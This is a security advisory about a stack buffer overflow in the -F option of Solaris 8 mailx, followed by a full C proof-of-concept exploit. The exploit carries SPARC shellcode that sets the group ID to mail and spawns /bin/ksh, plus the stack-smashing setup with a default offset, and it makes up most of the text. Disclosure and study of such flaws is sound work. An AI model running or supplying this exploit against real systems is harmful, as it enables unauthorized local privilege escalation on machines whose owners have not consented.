source: http://www.securityfocus.com/bid/2610/info
 
Solaris is the variant of the UNIX Operating System distributed by Sun Microsystems. Solaris is designed as a scalable operating system for the Intel x86 and Sun Sparc platforms, and operates on machines varying from desktop to enterprise server.
 
A problem with the handling of a long string of characters by the -F option makes it possible for a local user to gain elevated privileges. Due to the insufficient handling of input by the -F option of mailx, a buffer overflow at 1150 characters makes it possible to overwrite variables on the stack, including the return address.
 
This problem makes it possible for a local user gain elevated privileges, attaining an effective GID of mail. 

#include <fcntl.h>

/*

   /usr/bin/mailx overflow proof of conecpt.


   Pablo Sor, Buenos Aires, Argentina 05/2001
   psor@afip.gov.ar, psor@ccc.uba.ar

   works against Solaris 8 (SPARC)

   default offset should work.

   $ id
   uid=100(laika) gid=1(other)

   $ ./mailx-exp
   Subject: tomy
   .
   EOT

   [wait..]

   $ id
   uid=100(laika) gid=1(other) egid=6(mail)


*/


int main(int ac, char **av)
{

char shell[]=

  "\x90\x10\x20\x06\x82\x10\x20\x88\x91\xd0\x20\x08"  /* setegid(6) */
  "\x90\x10\x20\x06\x82\x10\x20\x2e\x91\xd0\x20\x08"  /* setgid(6) */

  /* LSD-pl.net guys shellcode */

  "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
  "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
  "\x91\xd0\x20\x08"     /* ta      8                    */
  "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4> */
  "\x20\xbf\xff\xff"     /* bn,a    <shellcode> */
  "\x7f\xff\xff\xff"     /* call    <shellcode+4> */
  "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
  "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
  "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
  "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
  "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
  "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
  "\x91\xd0\x20\x08"     /* ta      8                    */
  "/bin/ksh";


 u_long get_sp(void)
 {
   __asm__("mov %sp,%i0 \n");
 }

 unsigned long magic = get_sp() + 1444  ;  /* default offset */
 unsigned char buf[1220];
 char *envi;
 int cont;

 envi = (char *)malloc(1000*sizeof(char));
 for (cont=3;cont<990;cont=cont+4)
  { envi[cont]= 0xa6;envi[cont+1]=0x1c;envi[cont+2]=0xc0;envi[cont+3]=0x13; }
 for (cont=803;cont<803+strlen(shell);++cont) envi[cont]=shell[cont-803];
 memcpy(envi,"SO=",3);

 envi[999]=0;
 putenv(envi);
 memset(buf,0x41,1220);
 memcpy(buf+1120+24,&magic,4);  /* fake %fp */
 memcpy(buf+1120+28,&magic,4);  /* fake %i7 */
 buf[1220]=0;

 execl("/usr/bin/mailx","mailx","-F",buf,NULL);
}
